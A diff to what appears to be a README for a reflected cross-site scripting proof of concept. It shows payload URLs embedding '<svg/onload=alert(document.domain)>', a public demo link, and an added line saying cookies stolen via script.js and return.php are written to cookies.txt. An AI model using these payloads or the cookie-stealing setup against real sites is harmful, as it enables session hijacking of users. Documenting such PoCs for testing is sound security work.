@@ -13,6 +13,7 @@ for testing:
 ```
 [http://OUR_IP/index.php/<svg/onload=alert(document.domain)>?target=TARGET_URL]
 ```
+*Note: Replace OUR_IP and TARGET_URL as appropriate.*
 
 or to steal cookies:
 ```
@@ -30,5 +31,6 @@ http://OUR_IP/index.php/<svg/onload=alert(document.domain)>?target=http://p0c.ge
 He set up a PoC here which is the same as index.php. You can click this link directly as is:
 [http://p0c.geekboy.ninja/rxss.php/<svg/onload=alert(document.domain)>?target=http://p0c.geekboy.ninja/rxss-demo.php](http://p0c.geekboy.ninja/rxss.php/<svg/onload=alert(document.domain)>?target=http://p0c.geekboy.ninja/rxss-demo.php)
 
-*Note: Replace OUR_IP and TARGET_URL as appropriate.*
+
+If cookies are stolen via script.js and return.php, they will be written to cookies.txt.
 
